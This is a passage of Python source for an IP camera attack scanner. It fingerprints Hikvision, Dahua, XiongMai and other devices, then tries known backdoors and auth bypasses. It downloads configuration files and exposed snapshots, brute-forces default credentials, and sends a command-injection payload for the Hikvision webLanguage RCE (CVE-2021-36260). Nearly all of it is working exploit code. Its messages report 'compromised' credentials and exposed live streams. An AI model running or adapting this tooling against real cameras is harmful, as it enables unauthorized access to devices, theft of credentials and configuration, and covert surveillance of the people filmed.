                    + b"\xa0\x19\x02\x04\x1a\x2b\x3c\x4d\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00"
                )
                s.sendto(pkt, (ip, 161))
                data, _ = s.recvfrom(1024)
                if data:
                    return comm, True
        except Exception:
            pass
        return comm, False
    return await loop.run_in_executor(None, _do_snmp)

async def probe_snmp_async(ip: str, timeout: float = 0.5, communities: Optional[List[str]] = None) -> Dict[str, str]:
    comms = communities or ["public", "private", "cctv", "admin"]
    tasks = [_async_probe_snmp_single(ip, c, timeout) for c in comms]
    results = await asyncio.gather(*tasks)
    res: Dict[str, str] = {}
    for comm, ok in results:
        if ok:
            res[comm] = "SNMP v1/v2c responder active"
            cprint(f"  [+] [161/udp] SNMP community '{comm}' accepted", G)
    return res

def probe_snmp(ip: str, timeout: float = 0.5, communities: Optional[List[str]] = None) -> Dict[str, str]:
    return asyncio.run(probe_snmp_async(ip, timeout, communities))
def tcp_ip_fingerprint(ip: str, open_ports: List[int], timeout: float = 3.0) -> Dict[str, str]:
    if not open_ports:
        return {}
    res: Dict[str, str] = {}
    port = open_ports[0]
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            ttl = s.getsockopt(socket.IPPROTO_IP, socket.IP_TTL)
            res["ttl"] = str(ttl)
            for base_ttl, desc in TCP_SYN_FINGERPRINTS.items():
                if abs(ttl - base_ttl) <= 10:
                    res["os_estimate"] = desc
                    break
            buf = s.getsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF)
            res["rcv_buf"] = str(buf)
    except Exception:
        pass
    return res

def probe_http2_http3(ip: str, port: int, timeout: float = 3.5, session: Optional[requests.Session] = None) -> Tuple[bool, bool]:
    has_h2 = False
    has_h3 = False
    if port in HTTPS_PORTS:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2", "http/1.1"])
            with socket.create_connection((ip, port), timeout=timeout) as raw:
                with ctx.wrap_socket(raw, server_hostname=ip) as ssock:
                    alpn = ssock.selected_alpn_protocol()
                    if alpn == "h2":
                        has_h2 = True
        except Exception:
            pass
    r = http_get(f"{proto(port)}://{ip}:{port}/", timeout=timeout, session=session)
    if r:
        alt = r.headers.get("Alt-Svc", "").lower()
        if "h3" in alt or "quic" in alt:
            has_h3 = True
    return has_h2, has_h3

def probe_http_methods(
    ip: str,
    port: int,
    pr: str,
    timeout: float,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> List[Finding]:
    findings: List[Finding] = []
    sess = session or make_session()
    url = f"{pr}://{ip}:{port}/"
    rate_limit_sleep(ctx)
    try:
        r_opt = sess.options(url, timeout=timeout, verify=False)
        allow = r_opt.headers.get("Allow", "")
        if allow:
            vprint(f"HTTP Allowed Methods :{port} → {allow}", ctx)
    except Exception:
        allow = ""
    try:
        rate_limit_sleep(ctx)
        r_tr = sess.request("TRACE", url, timeout=timeout, verify=False)
        if r_tr and r_tr.status_code == 200 and "TRACE /" in (r_tr.text or ""):
            findings.append(Finding("HTTP_METHOD", "Cross-Site Tracing (XST) Enabled", "Server echoed TRACE request", "MEDIUM", port, url))
    except Exception:
        pass
    return findings

def probe_web_vulns(
    ip: str,
    port: int,
    pr: str,
    timeout: float,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> List[Finding]:
    findings: List[Finding] = []
    sess = session or make_session()
    base_url = f"{pr}://{ip}:{port}"
    try:
        rate_limit_sleep(ctx)
        r_cors = sess.get(f"{base_url}/", headers={"Origin": "https://attacker.evil"}, timeout=timeout, verify=False)
        if r_cors:
            acao = r_cors.headers.get("Access-Control-Allow-Origin", "")
            if acao in ("*", "https://attacker.evil"):
                findings.append(Finding("CORS", "Insecure CORS Policy", f"ACAO returned: {acao}", "MEDIUM", port, base_url))
    except Exception:
        pass
    for path in SENSITIVE_FILES[:8]:
        try:
            rate_limit_sleep(ctx)
            r_sen = sess.get(f"{base_url}{path}", timeout=timeout, verify=False)
            if r_sen and r_sen.status_code == 200 and len(r_sen.content) > 10:
                findings.append(Finding("EXPOSURE", f"Sensitive File Exposed: {path}", f"HTTP 200 with {len(r_sen.content)} bytes", "HIGH", port, f"{base_url}{path}"))
                cprint(f"  💀 Exposed File: {base_url}{path}", R)
                break
        except Exception:
            pass
    return findings

def probe_graphql_api(
    ip: str,
    port: int,
    pr: str,
    timeout: float,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> List[Finding]:
    findings: List[Finding] = []
    base_url = f"{pr}://{ip}:{port}"
    for path in ["/graphql", "/api/graphql"]:
        r = http_post(f"{base_url}{path}", json_data={"query": "{__typename}"}, timeout=timeout, session=session, ctx=ctx)
        if r and r.status_code == 200 and "data" in (r.text or ""):
            findings.append(Finding("API", "GraphQL Endpoint Detected", f"Active GraphQL schema at {path}", "LOW", port, f"{base_url}{path}"))
            cprint(f"  [+] GraphQL Endpoint Active: {base_url}{path}", C)
            break
    return findings

def fingerprint_port(
    ip: str,
    port: int,
    timeout: float,
    report: Report,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> Optional[str]:
    pr = proto(port)
    sh = body = all_hdr = ""
    r = http_get(f"{pr}://{ip}:{port}/", timeout=timeout, session=session, ctx=ctx)
    if r:
        sh = (r.headers.get("Server") or "").lower()
        body = (r.text or "").lower()
        all_hdr = " ".join(f"{k}:{v}" for k, v in r.headers.items()).lower()
    scores: Dict[str, int] = {}
    for brand, pats in BRANDS.items():
        sc = 0
        for pat in pats["server"]:
            if pat in sh:
                sc += 5
        for pat in pats["body"]:
            if pat in body:
                sc += 2
        for pat in pats["headers"]:
            if pat in all_hdr:
                sc += 4
        if sc > 0:
            scores[brand] = sc
    fav = get_favicon_hash(ip, port, timeout, ctx=ctx, session=session)
    if fav:
        fhash, fbrand = fav
        report.favicon_hash[port] = fhash
        if fbrand != "unknown":
            scores[fbrand] = scores.get(fbrand, 0) + 8
    if port in HTTPS_PORTS:
        tls = grab_tls_cert(ip, port, timeout)
        if tls:
            report.tls_info[port] = tls
            hint = tls.get("brand_hint", "")
            if hint:
                scores[hint] = scores.get(hint, 0) + 6
    top_score = max(scores.values()) if scores else 0
    if top_score < 7:
        cand = sorted(scores.keys(), key=lambda b: scores[b], reverse=True)[:3] if scores else list(BRANDS.keys())[:15]
        for brand in cand:
            pats = BRANDS.get(brand, {})
            for path in pats.get("paths", [])[:2]:
                rr = http_get(f"{pr}://{ip}:{port}{path}", timeout=timeout, session=session, ctx=ctx)
                if rr and rr.status_code in (200, 401):
                    txt = (rr.text or "").lower()
                    if rr.status_code == 200 and (brand in txt or "xml" in txt or "json" in txt or "device" in txt):
                        scores[brand] = scores.get(brand, 0) + 10
                    else:
                        scores[brand] = scores.get(brand, 0) + 4
                    break
    if not scores:
        return None
    return max(scores, key=scores.__getitem__)

def run_fingerprint(
    ip: str,
    open_ports: List[int],
    report: Report,
    timeout: float,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> Set[str]:
    web = [p for p in open_ports if p not in SKIP_PORTS and p not in RTSP_PORTS_SET]
    section(f"📡 Device Fingerprinting ({len(web)} active web ports)")
    detected: Set[str] = set()
    seen_serials: Set[str] = set()
    for idx, port in enumerate(web, 1):
        cprint(f"  [{idx}/{len(web)}] :{port} ", Y, end="")
        brand = fingerprint_port(ip, port, timeout, report, ctx, session)
        if brand:
            info = BRANDS[brand]
            cprint(f"{info['emoji']} {brand.upper()}", info["color"])
            detected.add(brand)
            _deep_probe(ip, port, brand, timeout, report, ctx, session)
            cur_serial = (
                report.device_info.get("serialNumber")
                or report.device_info.get("SerialNo")
                or report.device_info.get("serial")
            )
            if cur_serial:
                if cur_serial in seen_serials:
                    cprint(f"     [redundant] :{port} matches existing device {cur_serial}", DIM)
                else:
                    seen_serials.add(cur_serial)
        else:
            onvif = probe_onvif(ip, port, timeout, ctx, session)
            if onvif:
                cprint("📡 ONVIF Compliant Device", C)
                report.onvif[port] = onvif
                mfg = onvif.get("manufacturer", "").lower()
                for b in BRANDS:
                    if b in mfg:
                        detected.add(b)
                        break
            else:
                cprint("❓ Unknown Device", DIM)
    if ctx and ctx.allowed_brands:
        detected = {b for b in detected if b in ctx.allowed_brands}
    report.brands = list(detected)
    if detected:
        cprint(f"\n  🏷️  Identified Brands: {', '.join(detected)}", G)
    elif ctx and ctx.allowed_brands:
        cprint(f"\n  🏷️  No matching brands from filter: {', '.join(ctx.allowed_brands)}", Y)
    return detected
def _deep_probe(
    ip: str,
    port: int,
    brand: str,
    timeout: float,
    report: Report,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> None:
    pr = proto(port)
    dispatch: Dict[str, Callable] = {
        "hikvision": _probe_hikvision,
        "dahua": _probe_dahua,
        "axis": _probe_axis,
        "xiongmai": _probe_xiongmai,
        "hanwha": _probe_hanwha,
        "reolink": _probe_reolink,
        "dlink": _probe_dlink,
        "vivotek": _probe_vivotek,
        "foscam": _probe_foscam,
        "uniview": _probe_uniview,
        "tvt": _probe_tvt,
        "bosch": _probe_bosch,
    }
    fn = dispatch.get(brand)
    if fn:
        fn(ip, port, pr, timeout, report, ctx, session)

def _probe_hikvision(
    ip: str,
    port: int,
    pr: str,
    timeout: float,
    report: Report,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> None:
    r = http_get(f"{pr}://{ip}:{port}/ISAPI/System/deviceInfo", timeout=timeout, session=session, ctx=ctx)
    if r and r.status_code == 200 and r.text:
        cprint("     ✅ /ISAPI/System/deviceInfo 200 OK", G)
        for tag in ["deviceName", "model", "serialNumber", "firmwareVersion"]:
            m = re.search(rf"<{tag}>([^<]+)</{tag}>", r.text, re.I)
            if m:
                val = m.group(1).strip()
                report.device_info[tag] = val
                cprint(f"        🔹 {tag}: {val}", W)
    for auth in ["YWRtaW46MTEK", "YWRtaW46YWRtaW4K", "YWRtaW46MTIzNDU="]:
        rb = http_get(f"{pr}://{ip}:{port}/System/configurationFile?auth={auth}", timeout=3.0, session=session, ctx=ctx)
        if rb and rb.status_code == 200 and len(rb.content) > 100:
            cprint(f"     💀 Backdoor config download: /System/configurationFile?auth={auth}", R)
            report.add_note(f"HIK config backdoor :{port} auth={auth}")
            res = CVEResult("CVE-2018-18441", "hikvision", port, pr, ip, "Config file download auth bypass", f"auth={auth} size={len(rb.content)}b", "CRITICAL")
            report.add_cve(res)
            _maybe_save_config(ctx, port, rb.content)
            break
    r_alt = http_get(f"{pr}://{ip}:{port}/ISAPI/Event/notification/alertStream", timeout=timeout, session=session, ctx=ctx)
    if r_alt and r_alt.status_code == 200:
        url = f"{pr}://{ip}:{port}/ISAPI/Event/notification/alertStream"
        report.add_finding(Finding("PRIVACY", "Live alert stream exposed", f"Alert stream accessible unauthenticated on port {port}", "CRITICAL", port, url))
        cprint(f"     🚨 Live alert stream exposed unauthenticated at {url}", R)
def _probe_dahua(
    ip: str,
    port: int,
    pr: str,
    timeout: float,
    report: Report,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> None:
    for path in ["/cgi-bin/magicBox.cgi?action=getSystemInfo", "/RPC2"]:
        r = http_get(f"{pr}://{ip}:{port}{path}", timeout=timeout, session=session, ctx=ctx)
        if r and r.status_code in (200, 401):
            cprint(f"     ✅ Dahua {path} → HTTP {r.status_code}", G)
            if r.text and r.status_code == 200:
                for tag in ["SerialNo", "DeviceType", "HardVersion", "SoftVersion"]:
                    m = re.search(rf"{tag}\s*=\s*(.+)", r.text, re.I)
                    if m:
                        report.device_info[tag] = m.group(1).strip()

def _probe_axis(
    ip: str,
    port: int,
    pr: str,
    timeout: float,
    report: Report,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> None:
    for path in ["/axis-cgi/param.cgi?action=list&group=root.Brand", "/axis-cgi/basicdeviceinfo.cgi"]:
        r = http_get(f"{pr}://{ip}:{port}{path}", timeout=timeout, session=session, ctx=ctx)
        if r and r.status_code == 200 and r.text:
            cprint(f"     ✅ Axis endpoint active: {path}", G)
            for line in r.text.splitlines()[:10]:
                if any(x in line.lower() for x in ["brand", "model", "version", "serial", "prod"]):
                    parts = line.split("=", 1)
                    if len(parts) == 2:
                        report.device_info[parts[0].strip()] = parts[1].strip()
            break

def _probe_xiongmai(
    ip: str,
    port: int,
    pr: str,
    timeout: float,
    report: Report,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> None:
    r = http_get(f"{pr}://{ip}:{port}/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___", timeout=timeout, session=session, ctx=ctx)
    if r and r.status_code == 200:
        cprint("     💀 XiongMai UID=0 Backdoor Active!", R)
        report.add_note(f"XiongMai backdoor :{port}")

def _probe_hanwha(
    ip: str,
    port: int,
    pr: str,
    timeout: float,
    report: Report,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> None:
    r = http_get(f"{pr}://{ip}:{port}/stw-cgi/system.cgi?msubmenu=deviceinfo", timeout=timeout, session=session, ctx=ctx)
    if r and r.status_code == 200:
        cprint("     ✅ Hanwha Device Info Accessible", G)

def _probe_reolink(
    ip: str,
    port: int,
    pr: str,
    timeout: float,
    report: Report,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> None:
    r = http_get(f"{pr}://{ip}:{port}/cgi-bin/api.cgi?cmd=GetDevInfo", timeout=timeout, session=session, ctx=ctx)
    if r and r.status_code == 200:
        try:
            data = r.json()
            info = data[0].get("value", {}).get("DevInfo", {}) if isinstance(data, list) else {}
            for k in ["name", "model", "serial", "firmVer"]:
                if k in info:
                    report.device_info[k] = str(info[k])
        except Exception:
            pass

def _probe_dlink(
    ip: str,
    port: int,
    pr: str,
    timeout: float,
    report: Report,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> None:
    for path in ["/common/info.cgi", "/cgi-bin/hi3510/param.cgi?cmd=getserverinfo"]:
        r = http_get(f"{pr}://{ip}:{port}{path}", timeout=timeout, session=session, ctx=ctx)
        if r and r.status_code == 200 and r.text:
            cprint(f"     ✅ D-Link Info Accessible: {path}", G)
            break

def _probe_vivotek(
    ip: str,
    port: int,
    pr: str,
    timeout: float,
    report: Report,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> None:
    r = http_get(f"{pr}://{ip}:{port}/cgi-bin/viewer/getparam.cgi?system_info", timeout=timeout, session=session, ctx=ctx)
    if r and r.status_code == 200 and r.text:
        cprint("     ✅ Vivotek System Info Accessible", G)

def _probe_foscam(
    ip: str,
    port: int,
    pr: str,
    timeout: float,
    report: Report,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> None:
    r = http_get(f"{pr}://{ip}:{port}/cgi-bin/CGIProxy.fcgi?cmd=getDevState", timeout=timeout, session=session, ctx=ctx)
    if r and r.status_code == 200:
        cprint("     ✅ Foscam CGI Proxy Accessible", G)

def _probe_uniview(
    ip: str,
    port: int,
    pr: str,
    timeout: float,
    report: Report,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> None:
    r = http_get(f"{pr}://{ip}:{port}/LAPI/V1.0/System/Device/Info", timeout=timeout, session=session, ctx=ctx)
    if r and r.status_code == 200:
        cprint("     ✅ Uniview LAPI Endpoint Active", G)

def _probe_tvt(
    ip: str,
    port: int,
    pr: str,
    timeout: float,
    report: Report,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> None:
    r = http_get(f"{pr}://{ip}:{port}/device.rsp?opt=sys&cmd=get_device_info", timeout=timeout, session=session, ctx=ctx)
    if r and r.status_code == 200:
        cprint("     ✅ TVT Device Info Endpoint Active", G)

def _probe_bosch(
    ip: str,
    port: int,
    pr: str,
    timeout: float,
    report: Report,
    ctx: Optional[ScanContext] = None,
    session: Optional[requests.Session] = None,
) -> None:
    r = http_get(f"{pr}://{ip}:{port}/rcp.xml", timeout=timeout, session=session, ctx=ctx)
    if r and r.status_code == 200:
        cprint("     ✅ Bosch RCP XML Configuration Accessible", G)

def _format_dedup_auth(ip: str, dedup_auth: Dict[Tuple[int, str], List[str]]) -> List[str]:
    formatted: List[str] = []
    for (port, path), auths in dedup_auth.items():
        base = f"{proto(port)}://{ip}:{port}{path}"
        unique_auths = sorted(set(auths))
        if unique_auths:
            formatted.append(f"{base} [auth: {', '.join(unique_auths)}]")
        else:
            formatted.append(base)
    return formatted

def run_auth_pages(
    ip: str,
    open_ports: List[int],
    report: Report,
    timeout: float,
    max_threads: int = 80,
    ctx: Optional[ScanContext] = None,
) -> None:
    web = [p for p in open_ports if p not in SKIP_PORTS and p not in RTSP_PORTS_SET]
    paths = AUTH_PATHS
    if ctx and (getattr(ctx.args, "priority_paths", False) or not getattr(ctx.args, "full", False)):
        paths = TOP_AUTH_PATHS
    max_p = getattr(ctx.args, "max_auth_paths", 0) if ctx else 0
    if max_p > 0:
        paths = paths[:max_p]
    total = len(web) * len(paths)
    section(f"🔍 Auth Pages Discovery — {len(paths)} paths × {len(web)} ports = {total}", ctx)
    found: List[str] = []
    seen: Set[str] = set()
    dedup_auth: Dict[Tuple[int, str], List[str]] = {}
    lock = threading.Lock()
    sess = make_session(proxy=getattr(ctx.args, "proxy", None) if ctx else None,
                        user_agent=getattr(ctx.args, "user_agent", None) if ctx else None)

    def chk(url: str, port: int, path: str) -> None:
        key = f"{port}|{path}"
        if key in seen:
            return
        r = http_get(url, timeout=timeout, stream=True, session=sess, ctx=ctx)
        if not r or r.status_code != 200:
            return
        ct = (r.headers.get("Content-Type") or "").lower()
        chunk = b""
        try:
            for part in r.iter_content(4096):
                chunk += part
                if len(chunk) >= 8192:
                    break
        except Exception:
            pass
        parsed = urlparse(url)
        clean_path = parsed.path
        q = parse_qs(parsed.query)
        auths = q.get("auth", [])
        with lock:
            if key in seen:
                return
            seen.add(key)
            dk = (port, clean_path)
            if dk not in dedup_auth:
                dedup_auth[dk] = []
            dedup_auth[dk].extend(auths)
            cprint(f"  [+] 200 OK: {url}", G)
            if "alertstream" in clean_path.lower():
                report.add_finding(Finding("PRIVACY", "Live alert stream exposed", f"Unauthenticated alertStream exposed at {url}", "CRITICAL", port, url))
            if any(x in ct for x in ["image", "jpeg", "png"]) or chunk[:3] == b"\xff\xd8\xff":
                cprint(f"      🖼️  Snapshot Image endpoint active ({len(chunk)}b+)", M)
                _maybe_save_snapshot(ctx, port, url, chunk)

    with ThreadPoolExecutor(max_workers=max_threads) as ex:
        futs = [ex.submit(chk, f"{proto(p)}://{ip}:{p}{path}", p, path) for p in web for path in paths]
        for f in as_completed(futs):
            pass
    report.auth_pages = _format_dedup_auth(ip, dedup_auth)
    cprint(f"\n  📊 Discovered {len(report.auth_pages)} accessible authentication pages", G)
def _get_login_form(
    ip: str,
    url: str,
    timeout: float,
    ctx: Optional[ScanContext],
    sess: requests.Session,
) -> Optional[Tuple[str, Dict[str, str]]]:
    cache_key = (ip, url)
    if ctx and cache_key in ctx.form_cache:
        return ctx.form_cache[cache_key]
    r = http_get(url, timeout=timeout, session=sess, ctx=ctx)
    if not r or r.status_code != 200:
        if ctx:
            ctx.form_cache[cache_key] = None
        return None
    txt = r.text or ""
    form_m = re.search(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>', txt, re.I | re.S)
    if not form_m:
        form_m = re.search(r'<form[^>]*>(.*?)</form>', txt, re.I | re.S)
        if not form_m:
            if ctx:
                ctx.form_cache[cache_key] = None
            return None
    action = form_m.group(1) if form_m.lastindex and form_m.lastindex >= 1 else ""
    body_txt = form_m.group(form_m.lastindex or 1)
    fields: Dict[str, str] = {}
    for inp in re.finditer(r'<input[^>]+>', body_txt, re.I):
        tag = inp.group(0)
        nm = re.search(r'\bname=["\']([^"\']+)["\']', tag, re.I)
        tp = re.search(r'\btype=["\']([^"\']+)["\']', tag, re.I)
        if nm:
            fields[nm.group(1)] = (tp.group(1) if tp else "text").lower()
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    if action and not action.startswith("http"):
        action = urljoin(base + parsed.path, action)
    elif not action:
        action = url
    res = (action, fields)
    if ctx:
        ctx.form_cache[cache_key] = res
    return res

def _try_form_auth(
    ip: str,
    url: str,
    user: str,
    pw: str,
    timeout: float,
    ctx: Optional[ScanContext],
    sess: requests.Session,
) -> bool:
    form = _get_login_form(ip, url, timeout, ctx, sess)
    if not form:
        return False
    action, fields = form
    if not fields:
        return False
    data: Dict[str, str] = {}
    has_user = has_pass = False
    for name, ftype in fields.items():
        nl = name.lower()
        if ftype == "password":
            data[name] = pw
            has_pass = True
        elif any(x in nl for x in ["user", "login", "name", "account", "email"]):
            data[name] = user
            has_user = True
        elif ftype in ("text", "") and not has_user:
            data[name] = user
            has_user = True
    if not (has_user or has_pass):
        return False
    r_before = http_get(url, timeout=timeout, session=sess, ctx=ctx)
    hash_before = hashlib.sha256(r_before.content).hexdigest() if r_before else ""
    r_post = http_post(action, data=data, timeout=timeout, session=sess, ctx=ctx)
    if not r_post:
        return False
    if r_post.status_code in (301, 302, 303, 307):
        loc = r_post.headers.get("Location", "").lower()
        if "login" not in loc and "error" not in loc:
            return True
    if r_post.status_code == 200:
        hash_after = hashlib.sha256(r_post.content).hexdigest()
        txt = (r_post.text or "").lower()
        has_error = any(x in txt for x in ["invalid", "incorrect", "wrong", "failed", "error", "denied"])
        if hash_after != hash_before and not has_error:
            return True
    return False

def _probe_auth_endpoints(
    ip: str,
    port: int,
    pr: str,
    timeout: float,
    ctx: Optional[ScanContext],
    sess: requests.Session,
) -> List[Tuple[str, int]]:
    probes = [
        f"{pr}://{ip}:{port}/ISAPI/Security/userCheck",
        f"{pr}://{ip}:{port}/ISAPI/System/deviceInfo",
        f"{pr}://{ip}:{port}/cgi-bin/magicBox.cgi?action=getSystemInfo",
        f"{pr}://{ip}:{port}/axis-cgi/param.cgi?action=list",
        f"{pr}://{ip}:{port}/",
    ]
    res: List[Tuple[str, int]] = []
    for u in probes:
        r = http_get(u, timeout=timeout, session=sess, ctx=ctx)
        if r and r.status_code in (200, 401, 403):
            res.append((u, r.status_code))
            if len(res) >= 2:
                break
    return res

def _test_combo(
    ip: str,
    p: int,
    u: str,
    pw: str,
    timeout: float,
    sess: requests.Session,
    ctx: Optional[ScanContext],
    seen: Set[Tuple[str, str, str]],
    found: List[Dict[str, str]],
    report: Report,
    lock: threading.Lock,
) -> None:
    pr = proto(p)
    endpoints = _probe_auth_endpoints(ip, p, pr, timeout, ctx, sess)
    if not endpoints:
        return
    for url, code in endpoints:
        ok_b = ok_d = ok_f = False
        r_b = http_get(url, timeout=timeout, auth=(u, pw), session=sess, ctx=ctx)
        if r_b and r_b.status_code == 200 and code in (401, 403):
            ok_b = True
        if not ok_b:
            r_d = http_get(url, timeout=timeout, auth=HTTPDigestAuth(u, pw), session=sess, ctx=ctx)
            if r_d and r_d.status_code == 200 and code in (401, 403):
                ok_d = True
        if not ok_b and not ok_d and url.endswith("/"):
            ok_f = _try_form_auth(ip, url, u, pw, timeout, ctx, sess)
        if ok_b or ok_d or ok_f:
            m = "basic" if ok_b else ("digest" if ok_d else "form")
            with lock:
                k = (u, pw, str(p))
                if k not in seen:
                    seen.add(k)
                    entry = {"url": url, "user": u, "password": pw, "method": m, "port": str(p)}
                    if report.add_cred(entry):
                        found.append(entry)
                        cprint(f"  🔥 [{m.upper()}] Compromised Credential: {u}:{pw} → {url}", R)

def run_creds(
    ip: str,
    open_ports: List[int],
    report: Report,
    timeout: float,
    max_threads: int = 50,
    ctx: Optional[ScanContext] = None,
) -> None:
    web = [p for p in open_ports if p not in SKIP_PORTS and p not in RTSP_PORTS_SET][:12]
    cred_dict = CREDS if (ctx and getattr(ctx.args, "full", False)) else TOP_CREDS
    total_creds = sum(len(v) for v in cred_dict.values())
    total_jobs = len(web) * total_creds
    section(f"🔑 Credential Brute-Force — {total_creds} passwords across {len(web)} ports = {total_jobs} checks", ctx)
    found: List[Dict[str, str]] = []
    seen: Set[Tuple[str, str, str]] = set()
    lock = threading.Lock()
    port_sessions: Dict[int, requests.Session] = {p: make_session() for p in web}
    jobs = [(p, u, pw) for p in web for u, pws in cred_dict.items() for pw in pws]
    with Progress(
        SpinnerColumn(),
        TextColumn("[bold yellow]{task.description}"),
        BarColumn(bar_width=30),
        MofNCompleteColumn(),
        TimeElapsedColumn(),
        TimeRemainingColumn(),
        console=RC,
    ) as progress:
        task = progress.add_task(f"Testing {len(jobs)} credential combinations", total=len(jobs))
        with ThreadPoolExecutor(max_workers=max_threads) as ex:
            futs = []
            for p, u, pw in jobs:
                fut = ex.submit(_test_combo, ip, p, u, pw, timeout, port_sessions[p], ctx, seen, found, report, lock)
                fut.add_done_callback(lambda _: progress.advance(task))
                futs.append(fut)
            for f in as_completed(futs):
                pass
    if found:
        cprint(f"\n  ✅ Compromise Confirmed: {len(found)} valid credentials found!", G)
    else:
        cprint("  ❌ No valid default credentials found", Y)
def _probe_rtsp_endpoints(ip: str, rtsp_ports: List[int], timeout: float, report: Report) -> None:
    if not rtsp_ports:
        return
    cprint("\n  [🎯] Active RTSP Media Endpoints:", C)
    rtsp_paths = ["/Streaming/Channels/101", "/Streaming/Channels/1", "/cam/realmonitor?channel=1&subtype=0", "/live", "/"]
    for p in rtsp_ports:
        cprint(f"  📡 RTSP Service on Port {p}:", Y)
        rtsp_info = rtsp_full_handshake(ip, p, timeout)
        if rtsp_info:
            report.rtsp_info[p] = str(rtsp_info)
            codecs = rtsp_info.get("codecs", "")
            if codecs:
                cprint(f"     Codec info: {codecs}", DIM)
        for path in rtsp_paths:
            u = f"rtsp://{ip}:{p}{path}"
            if u not in report.streams:
                report.streams.append(u)
            cprint(f"     📡 {u}", B)

def run_streams(
    ip: str,
    open_ports: List[int],
    rtsp_ports: List[int],
    report: Report,
    timeout: float,
    max_threads: int = 60,
    ctx: Optional[ScanContext] = None,
) -> None:
    section(f"🎥 Video Stream & Snapshot Discovery", ctx)
    hits: List[str] = []
    seen: Set[str] = set()
    lock = threading.Lock()
    sess = make_session(proxy=getattr(ctx.args, "proxy", None) if ctx else None,
                        user_agent=getattr(ctx.args, "user_agent", None) if ctx else None)
    paths = STREAM_PATHS
    if ctx and (getattr(ctx.args, "priority_paths", False) or not getattr(ctx.args, "full", False)):
        paths = TOP_STREAM_PATHS
    max_p = getattr(ctx.args, "max_stream_paths", 0) if ctx else 0
    if max_p > 0:
        paths = paths[:max_p]

    def chk_stream(url: str, port: int) -> None:
        r = http_get(url, timeout=timeout + 2, stream=True, session=sess, ctx=ctx)
        if not r or r.status_code != 200:
            return
        ct = (r.headers.get("Content-Type") or "").lower()
        chunk = b""
        try:
            for part in r.iter_content(4096):
                chunk += part
                if len(chunk) >= 8192:
                    break
        except Exception:
            pass
        is_media = (
            any(x in ct for x in ["image", "jpeg", "png", "mjpeg", "multipart"])
            or chunk[:3] == b"\xff\xd8\xff"
            or chunk[:4] == b"\x89PNG"
            or chunk[:4] == b"\x47\x49\x46\x38"
        )
        if is_media and len(chunk) > 100:
            with lock:
                ch_key = _channel_key(port, url)
                if ch_key not in seen and url not in report.streams:
                    seen.add(ch_key)
                    hits.append(url)
                    report.streams.append(url)
                    tag = ct.split(";")[0] if ct else "image"
                    cprint(f"  [+] Media Stream: {url} ({tag}, {len(chunk)}b+)", M)
                    _maybe_save_snapshot(ctx, port, url, chunk)

    web_ports = [p for p in open_ports if p not in SKIP_PORTS and p not in RTSP_PORTS_SET]
    jobs = [(f"{proto(p)}://{ip}:{p}{path}", p) for p in web_ports for path in paths]
    with ThreadPoolExecutor(max_workers=max_threads) as ex:
        for f in as_completed([ex.submit(chk_stream, u, p) for u, p in jobs]):
            pass
    _probe_rtsp_endpoints(ip, rtsp_ports, timeout, report)
    cprint(f"\n  📊 Discovered {len(report.streams)} unique video streams & media channels", G)

def _cve_hik_36260(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    payload = b'<?xml version="1.0"?><language>$(id)</language>'
    r = http_put(f"{pr}://{ip}:{port}/SDK/webLanguage", data=payload, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=timeout, session=sess, ctx=ctx)
    if r and r.status_code in (200, 500) and "uid=" in (r.text or ""):
        txt = r.text or ""
        idx = txt.find("uid=")
        proof = txt[idx:idx + 200]
        return CVEResult("CVE-2021-36260", "hikvision", port, pr, ip, "RCE via webLanguage endpoint", proof, "CRITICAL")
    return None
def _cve_hik_7921(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    for path in ["/ISAPI/System/deviceInfo", "/ISAPI/Security/users", "/ISAPI/System/status"]:
        r = http_get(f"{pr}://{ip}:{port}{path}", timeout=timeout, session=sess, ctx=ctx)
        if r and r.status_code == 200:
            txt = r.text or ""
            if any(x in txt for x in ["<deviceName>", "<userName>", "<DeviceInfo>"]):
                return CVEResult("CVE-2017-7921", "hikvision", port, pr, ip, "Auth bypass: unauthenticated ISAPI access", txt[:100], "HIGH")
    return None

def _cve_hik_18441(ip: str, port: int, pr: str, timeout: float, ctx: Optional[ScanContext], sess: requests.Session) -> Optional[CVEResult]:
    for auth in ["YWRtaW46MTEK", "YWRtaW46YWRtaW4K", "YWRtaW46MTIzNDU="]:
        r = http_get(f"{pr}://{ip}:{port}/System/configurationFile?auth={auth}", timeout=timeout, session=sess, ctx=ctx)
        if r and r.status_code == 200 and len(r.content) > 100:
            _maybe_save_config(ctx, port, r.content)
